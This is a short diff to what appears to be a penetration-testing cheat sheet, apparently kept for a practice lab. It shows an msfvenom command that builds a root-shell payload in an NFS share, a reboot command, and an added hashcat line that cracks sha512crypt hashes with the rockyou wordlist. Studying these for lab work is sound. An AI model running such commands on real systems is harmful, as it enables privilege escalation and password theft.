@@ -587,3 +587,6 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
 
 Reboot windows machine from OSPG:
 shutdown -r -t 10 && exit
+
+
+hashcat -m 1800 -a 0 -o found.txt --remove crack.hash /usr/share/wordlists/rockyou.txt
